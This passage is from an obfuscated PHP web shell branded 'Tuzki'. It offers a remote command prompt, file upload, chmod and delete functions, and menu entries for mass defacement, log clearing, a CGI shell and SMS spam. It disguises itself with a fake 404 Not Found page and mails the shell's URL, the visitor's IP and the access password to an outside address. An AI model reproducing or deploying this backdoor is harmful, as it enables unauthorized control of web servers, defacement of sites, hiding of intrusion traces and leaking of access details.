     goto QUDth;
     KeWoN: rename("\151nde\170\56\150t\155l", "in\144\145\170\56\150\164\155\154.bak");
     goto TKbmP;
     znHhG: EP_0f: goto BKRdV;
     AfVFV:
 } goto pxJ_h; q1mxz: IIev0: goto eVXgr; mMTy_: goto Jkk29; goto bM1qs; f8uYC: goto Jkk29; goto JdLdN; qdGnG: @mail($email, "\114ogs", $content_mail, "F\162\157m\72\103v\141r1\71\70\64"); goto n4U_N; XHZO8: goto Jkk29; goto v1c6o; pDr2s: $dir = scandir(getcwd()); goto SmrFX; v1c6o: kJyiJ: goto m8Vl9; wxaII: if ($_GET["do"] == "de\154ete" and isset($_GET["\146il\145s"])) {
     goto q7lM0;
 } goto lYqT1; rA38k: JjiXg("\125pl\157\141\144\40\106ail\145d"); goto L1bpu; bBZU9: function glsbx()
 {
     goto M4ksq;
     qCvTp: if (!isset($_POST["\143\157\155ma\156d"])) {
         goto xIkZC;
     }
     goto u_LzW;
     WrGHP: ?>
<center>
		<form method="post">
			<input type="text" class='input-sm' id='input' name="command" /> <input
				type="submit" class="btn btn-danger" />
		</form>
	</center>
	<form></form>
<?php  goto X5M8A;
     u_LzW: echo "\74\143\145\156\164\145r>\74te\170t\141\162\145a\40i\144='\164\145\170t\141re\141\47 \143\154ass=\47f\157\162\155\55\143\157n\164\162\157l' rea\144on\154\171\76" . U4tUx($_POST["co\155man\144"]) . "</tex\164ar\145a\76\74/cen\164e\162>";
     goto MezQW;
     X5M8A: die;
     goto NkcVE;
     MezQW: xIkZC: goto WrGHP;
     M4ksq: echo "\74c\145n\164e\162>\74\1502>Comma\156d \120r\157m\160\164</\1502\76<\57ce\156\164e\162>";
     goto qCvTp;
     NkcVE:
 } goto d940G; Dn0ba: TnBrl(); goto G7bgQ; neAj8: chdir($dir); goto FZCUK; wb8wZ: $sep = "/"; goto zknN1; pGXIU: pQmVw: goto BV3jv; DdRy8: VZy1Y($_GET["d\151\162"]); goto VGEHJ; vQ3dI: M4L6u(); goto buNrn; nLbsJ: if (!function_exists("\146\151\154\145\137\160\165\164_c\157\156\164e\156t\163")) {
     echo "\74\163cri\160\164>al\145\162\164\50'file\137\160\165\164\137co\156\164ents\40\146u\156c\164io\156 \144\151\163\141ble\144\54\40thi\163\40\167\145b\163\150\145l\154\40no\164 \167\157\162\153i\156\147 p\162\157\160erl\171\47)\74\57\163c\162ip\164>";
 } goto YeyTs; v33r3: if ($_GET["\144o"] == "s\150\157r\164lin\153") {
     goto kX6ei;
 } goto IxX6P; AmxkD: jjiXg("Up\154\157ad\40\123ucc\145s\163"); goto gRcNX; lTD8w: if ($_GET["\144\157"] == "n\145t\167\157rk") {
     goto uWVJj;
 } goto mMTy_; WdooI: t30L2: goto Eft_I; aZCmH: Ve1hM: goto jyqm9; tsNUj: UHcBW(); goto E_3T1; cxDMj: function VzY1Y($dir)
 {
     goto w2sdb;
     jXHBz: goto dDIz5;
     goto MCuMY;
     NXgDP: jjIXg("\123\165cce\163s");
     goto qdGEw;
     w2sdb: if (@mkdir($dir . "/" . "new\137\144i\162")) {
         goto WTq_G;
     }
     goto oZgmR;
     MCuMY: WTq_G: goto NXgDP;
     oZgmR: JjIxg("\120\145rm\151\163\163\151\157\156\40\104\145nied Or\40File\40E\170\151st\163");
     goto jXHBz;
     qdGEw: dDIz5: goto IHEUJ;
     IHEUJ:
 } goto upQzj; wi8wr: uWVJj: goto ctUzc; VHd9t: goto XGeZ9; goto q1mxz; haBwC: if ($_GET["\144\157"] == "\154o\147s") {
     goto Ve1hM;
 } goto tUoBK; NQAe_: $_SESSION[sha1(md5($_SERVER["H\124TP_HOS\124"]))] = true; goto BZ_hd; BWB1O: if ($_GET["d\157"] == "\164\157\165ch" and isset($_GET["\146i\154es"])) {
     goto w41X1;
 } goto lTD8w; aux2O: gYzgO(); goto bB4u4; Fhp6L: L1ZR1(); goto GJDO7; ctUzc: HNMnj(); goto ThQCb; YeyTs: $shell_path = $content_mail = "URL\40\72 \150t\164p://" . $_SERVER["\123ERV\105R_\116A\115\105"] . $_SERVER["\122EQ\125\105\123\124\137\125\122\111"] . "\12\12\111P\40\72 " . $_SERVER["RE\115OTE_\101\104\104R"] . "\12\12\120as\163w\157r\144\40:\40" . $auth_pass . "\12\xaBy\40Cva\162\619\704"; goto Sp_ot; bn54s: function K3j3z()
 {
     goto wzIkj;
     gTkcD: exit;
     goto soEyj;
     rOmAV: echo $_SERVER["\120H\120\137\123EL\106"];
     goto N4JS1;
     N4JS1: ?> was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
<?php  goto gTkcD;
     wzIkj: ?>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL <?php  goto rOmAV;
     soEyj:
 } goto JfUXZ; JdLdN: OExGh: goto vQ3dI; FZCUK: goto Jkk29; goto Hz6Gx; d_edT: YccVm(); goto lALpc; KXAl7: function UEqDa($filename)
 {
     goto QDMVj;
     RbMM9: nizoE: goto wi1jx;
     j48C1: die;
     goto unN1f;
     jD5Mo: goto nizoE;
     goto UCRmK;
     UCRmK: d3Rpm: goto ni7xo;
     Q0ZX0: U0rbo: goto LSHZo;
     wi1jx: tnBRL();
     goto Q0ZX0;
     LSHZo: ?>
   <form method='post'>
		<center>
			<td>Permission : <input type='text' class='input-sm' id='input'
				value='0755' name='permission'></td> <input type='submit'
				class='btn btn-danger' name='action' value='chmod'>
		</center>
	</form>
	<?php  goto j48C1;
     zUEaS: if (chmod($filename, $_POST["\160\145\162miss\151\157n"])) {
         goto d3Rpm;
     }
     goto UZgRY;
     ni7xo: JJixG("S\165\143ce\163s");
     goto RbMM9;
     UZgRY: JjiXG("P\145\162mis\163io\156\40\104eni\145\144");
     goto jD5Mo;
     QDMVj: if (!isset($_POST["\141\143\164i\157\156"])) {
         goto U0rbo;
     }
     goto zUEaS;
     unN1f:
 } goto oUttM; Db0q_: XGeZ9: goto kN_m_; GJDO7: goto Jkk29; goto GS__n; zknN1: $os = "L\151\156\165x"; goto s5SwB; DgSHm: c5S6g(); goto f8uYC; GS__n: zBGpp: goto tsNUj; m8Vl9: $dir = $_GET["di\162"]; goto neAj8; tVkjr: kX6ei: goto xD83Z; q3ebb: S1ihE: goto bn54s; nENXh: Jjanc($_GET["\146\151l\145\163"]); goto YVxpL; yTS4n: function Spmg1($filename)
 {
     jJIxg("this ex\164ens\151\157\156 is not\40\163\165\160p\157\162ted");
     tNBrL();
 } goto deCzC; Eft_I: xiZFI($_GET["\146\151\154e\163"]); goto XHZO8; BV3jv: YqYC7(); goto xtMZ1; E_3T1: goto Jkk29; goto tVkjr; tZReq: header("H\124\124P/1.0 \640\64\40\116\157\164 F\157u\156d"); goto kWim3; iUmx7: qH8q8: goto DgSHm; lsPIc: if (@T9Gaw($_GET["\146il\145s"])) {
     goto IIev0;
 } goto wdnHz; T3NUU: ?>
<nav class="navbar navbar-inverse">
	<div class="container-fluid">
		<div class="navbar-header">
			<a class="navbar-brand" href="https://github.com/BlackHoleSecurity/backdoor">Tuzki</a>
		</div>
		<ul class="nav navbar-nav">
			<li class="active"><a href="?">Home</a></li>
			<li class="dropdown"><a class="dropdown-toggle" data-toggle="dropdown" href="#">Tools <span class="caret"></span></a>
				<ul class="dropdown-menu">
					<li><a href='?do=cmd'><span class="glyphicon glyphicon-list-alt"></span> Command Prompt</a></li>
					<li><a href='?do=sms'><span class="glyphicon glyphicon-envelope"></span> Spam SMS</a></li>
					<li><a href='?do=music'><span class="glyphicon glyphicon-headphones"></span> Music</a></li>
					<li><a href='?do=jumping'><span class="glyphicon glyphicon-transfer"></span> Jumping</a></li>
					<li><a href='?do=config'><span class="glyphicon glyphicon-wrench"></span> Config</a></li>
					<li><a href='?do=mass_deface'><span class="glyphicon glyphicon-random"></span> Mass Deface</a></li>
					<li><a href='?do=info'><span class="glyphicon glyphicon-info-sign"></span> Server Info</a></li>
					<li><a href='?do=logs'><span class="glyphicon glyphicon-retweet"></span> Clear Logs</a></li>
					<li><a href='?do=cgi'><span class="glyphicon glyphicon-duplicate"></span> CGI Shell</a></li>
					<li><a href='?do=deface'><span class="glyphicon glyphicon-user"></span> Auto Deface</a></li>
					<li><a href='?do=shortlink'><span class="glyphicon glyphicon-link"></span> Shortlink Generator</a></li>
					<li><a href='?do=network'><span class="glyphicon glyphicon-globe"></span> Network</a></li>
				</ul>
			</li>
			<li><a href='?do=logout'><span class="glyphicon glyphicon-off"></span> Logout</a></li>
		</ul>
	</div>
</nav>
<?php  goto pwCJW; OI4ds: echo date("Y"); goto QjL6a; prBdu: goto Jkk29; goto lXYhF; YRYYO: function yqYc7()
 {
     goto jqEUs;
     jqEUs: echo "<\143\145nt\145r>";
     goto T3c8A;
     It7HB: die;
     goto IlAPv;
     T3c8A: echo "\74\151f\162\141me\40\167idt\150='7\60\60\160\170' h\145i\147ht\75\47\65\600\160x' \163\143roll\151ng\75\47n\157' f\162\141m\145bord\145\162=\47\156\157\47\40s\162\143='\150ttps\72\57/\167\56sou\156dcl\157\165\144.com/\160\154\141y\145\162\57\77u\162l=\150t\164ps:/\57\141p\151\56\163oundcl\157\165\144.\143\157\155\57\160l\141yl\151\163t\163/355874\711\61\46a\155\160;\143o\154\157r\75#\600\143c1\61&amp\73au\164o\137\160l\141y=true\46\141\155\160\73hide_rel\141t\145\144\75\146alse\46\141m\160\73\163\150ow_comments=tru\145&\141\155\160\73\163\150ow_\165ser\75t\162ue&am\160;s\150\157\167\137\162\145p\157s\164s=f\141lse&\141\155\160;\163\150o\167_\164ea\163er\75\164r\165\145&\141\155p;vi\163u\141l=\164rue\47>\74\57\151\146ra\155\145>";
     goto q5pHX;
     q5pHX: echo "</ce\156t\145r\76";
     goto It7HB;
     IlAPv:
 } goto XyLTN; OMq5A: goto Jkk29; goto pGXIU; zNXEM: if ($_GET["do"] == "\150\157me") {
     goto Guyes;
 } goto fP0qQ; Vw1Hz: if ($_GET["\144o"] == "m\165\163\151c") {
     goto pQmVw;
 } goto OToAi; jyqm9: UIEKr(); goto g8_oj; caYUZ: function JjixG($message)
 {
     goto cemld;
     ONmgf: echo "'" . $message . "\47";
     goto terM6;
     cemld: ?>
<script type="text/javascript">
var ALERT_TITLE = "Alert";
var ALERT_BUTTON_TEXT = "Ok";
if (document.getElementById) {
	window.alert = function(txt) {
		createCustomAlert(txt);
	}
}

function createCustomAlert(txt) {
	d = document;
	if (d.getElementById("modalContainer")) return;
	mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
	mObj.id = "modalContainer";
	mObj.style.height = d.documentElement.scrollHeight + "px";
	alertObj = mObj.appendChild(d.createElement("div"));
	alertObj.id = "alertBox";
	if (d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
	alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth) / 2 + "px";
	alertObj.style.visiblity = "visible";
	h1 = alertObj.appendChild(d.createElement("h1"));
	h1.appendChild(d.createTextNode(ALERT_TITLE));
	msg = alertObj.appendChild(d.createElement("p"));
	//msg.appendChild(d.createTextNode(txt));
	msg.innerHTML = txt;
	btn = alertObj.appendChild(d.createElement("a"));
	btn.id = "closeBtn";
	btn.appendChild(d.createTextNode(ALERT_BUTTON_TEXT));
	btn.href = "#";
	btn.focus();
	btn.onclick = function() { removeCustomAlert(); return false; }
	alertObj.style.display = "block";
}

function removeCustomAlert() {
	document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
}
</script>
<style type="text/css">
#modalContainer {
	background-color: rgba(0, 0, 0, 0.3);
	position: absolute;
	width: 100%;
	height: 100%;
	top: 0px;
	left: 0px;
	z-index: 10000;
	/* required by MSIE to prevent actions on lower z-index elements */
}

#alertBox {
	position: relative;
	width: 300px;
	min-height: 100px;
	margin-top: 50px;
	border: 1px solid #666;
	background-color: #fff;
	background-repeat: no-repeat;
	background-position: 20px 30px;
}

#modalContainer>#alertBox {
	position: fixed;
}

#alertBox h1 {
	margin: 0;
	font: bold 0.9em verdana, arial;
	background-color: #3073BB;
	color: #FFF;
	border-bottom: 1px solid #000;
	padding: 2px 0 2px 5px;
}

#alertBox p {
	color: red;
	height: 50px;
	padding-left: 5px;
	margin-left: 55px;
}

#alertBox #closeBtn {
	display: block;
	position: relative;
	margin: 5px auto;
	padding: 7px;
	border: 0 none;
	width: 70px;
	font: 0.7em verdana, arial;
	text-transform: uppercase;
	text-align: center;
	color: #FFF;
	background-color: #357EBD;
	border-radius: 3px;
	text-decoration: none;
}


/* unrelated styles */

#mContainer {
	position: relative;
	width: 600px;
	margin: auto;
	padding: 5px;
	border-top: 2px solid #000;
	border-bottom: 2px solid #000;
	font: 0.7em verdana, arial;
}

h1,
h2 {
	margin: 0;
	padding: 4px;
	font: bold 1.5em verdana;
	border-bottom: 1px solid #000;
}

code {
	font-size: 1.2em;
	color: #069;
}

#credits {
	position: relative;
	margin: 25px auto 0px auto;
	width: 350px;
	font: 0.7em verdana;
	border-top: 1px solid #000;
	border-bottom: 1px solid #000;
	height: 90px;
	padding-top: 4px;
}

#credits img {
	float: left;
	margin: 5px 10px 5px 0px;
	border: 1px solid #000000;
	width: 80px;
	height: 79px;
}

.important {
	background-color: #F5FCC8;
	padding: 2px;
}

.main {
	width: 100%;
	box-shadow: inset 0 -1px 0 rgba(48, 48, 48, 0.7), 0 2px 4px rgba(48, 48, 48, 0.7);
}

.vn-nav ul {
	margin: 0;
	padding: 0;
	list-style-type: none;
	list-style-image: none;
}

.vn-nav li {
	margin-right: 0px;
	display: inline;
}

.vn-nav ul li a {
	text-decoration: none;
	margin: 0px;
	padding: 15px 20px 15px 20px;
	color: #ffffff;
}

.vn-nav li.current-menu-item a {
	color: #fff;
	text-decoration: none;
	background-color: #16a085;
}

.vn-nav li.current_page_item {
	color: #fff;
	text-decoration: none;
	background-color: #16a085;
}

.modalDialog {
	position: fixed;
	font-weight: bold;
	font-family: 'Agency FB';
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	background: rgba(0, 0, 0, 0.8);
	z-index: 99999;
	opacity: 0;
	-webkit-transition: opacity 400ms ease-in;
	-moz-transition: opacity 400ms ease-in;
	transition: opacity 400ms ease-in;
	pointer-events: none;
}

.modalDialog:target {
	opacity: 1;
	pointer-events: auto;
}

.modalDialog>div {
	width: 500px;
	height: auto;
	position: relative;
	margin: 5% auto;
	padding: 5px 20px 13px 20px;
	background: #34495e;
	color: #fff;
}

.close {
	background: #2c3e50;
	color: #16a085;
	padding: 5px;
	position: right;
	right: -55px;
	text-align: center;
	top: 0;
	width: auto;
	float: left;
	text-decoration: none;
	font-weight: bold;
}

.close:hover {
	background: #2c3e50;
	color: #e74c3c
}

.vn-green a {
	background: #27ae60;
	padding: 10px;
	color: #fff;
}

.vn-green a:hover {
	color: red;
	background: #21894d;
	text-decoration: none;
}
</style>
<script type="text/javascript">alert(<?php  goto ONmgf;
     terM6: ?>);</script>
<?php  goto lgIu4;
     lgIu4:
 } goto acC90; qkhAz: CJNkO: goto nYmSZ; bM1qs: Guyes: goto Dn0ba; Y4e5u: ?>
	<form method="post" enctype="multipart/form-data">
		<center>
			<input class="btn" type="file" name="file" />
			<input class="btn btn-danger" name="upl" type="submit" value="Save">
		</center>
	</form>
</body>
</html>